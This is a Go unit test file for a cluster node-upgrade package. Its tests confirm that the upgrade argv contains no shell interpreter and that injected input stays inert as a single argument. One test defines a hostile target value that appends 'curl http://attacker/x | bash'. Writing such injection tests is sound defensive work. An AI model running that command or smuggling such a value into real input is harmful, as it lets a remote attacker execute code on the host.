package upgrade

import (
	"strings"
	"testing"
)

// TestNodeUpgradeArgvHasNoShell is the structural guarantee: no
// interpreter is present anywhere in the payload, so nothing in it can be
// re-parsed as code. A regression here re-opens the injection channel even if
// every validator upstream still passes.
func TestNodeUpgradeArgvHasNoShell(t *testing.T) {
	argv := nodeUpgradeArgv(ClusterOptions{
		From: "/var/lib/stratum-upgrade/stratum-v1.36.2", Target: "v1.36.2", SoakSec: 15,
	}, Node{})
	for i, a := range argv {
		if a == "-c" {
			t.Errorf("argv[%d] is %q — a shell -c flag is back in the payload", i, a)
		}
		for _, sh := range []string{"bash", "/bin/sh", "zsh"} {
			if strings.Contains(a, sh) {
				t.Errorf("argv[%d] = %q contains a shell (%q)", i, a, sh)
			}
		}
	}
	if got := argv[9]; got != "/var/lib/stratum-upgrade/stratum-v1.36.2" {
		t.Errorf("exec target = %q, want the staged upgrade binary itself", got)
	}
}

// Hostile values must land as ONE argv element each and never be split,
// concatenated, or interpreted. Preflight rejects these upstream; this asserts
// the payload layer is safe on its own, so the two controls are independent.
func TestNodeUpgradeArgvKeepsHostileValuesAsSingleElements(t *testing.T) {
	const evil = "v1.36.2; curl http://attacker/x | bash"
	argv := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: evil, SoakSec: 15}, Node{})

	idx := -1
	for i, a := range argv {
		if a == "--target" {
			idx = i + 1
		}
	}
	if idx < 0 || idx >= len(argv) {
		t.Fatal("no --target in argv")
	}
	if argv[idx] != evil {
		t.Errorf("--target value = %q, want the payload intact in exactly one element", argv[idx])
	}
	for i, a := range argv {
		if i != idx && strings.Contains(a, "curl") {
			t.Errorf("argv[%d] = %q — the payload leaked into another element", i, a)
		}
	}
}

func TestNodeUpgradeArgvSkipSnapshot(t *testing.T) {
	base := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: "v1.36.2", SoakSec: 15}, Node{})
	with := nodeUpgradeArgv(ClusterOptions{From: "/b", Target: "v1.36.2", SoakSec: 15, SkipSnapshot: true}, Node{})
	if len(with) != len(base)+1 || with[len(with)-1] != "--skip-snapshot" {
		t.Errorf("SkipSnapshot argv = %v, want base + --skip-snapshot", with)
	}
}
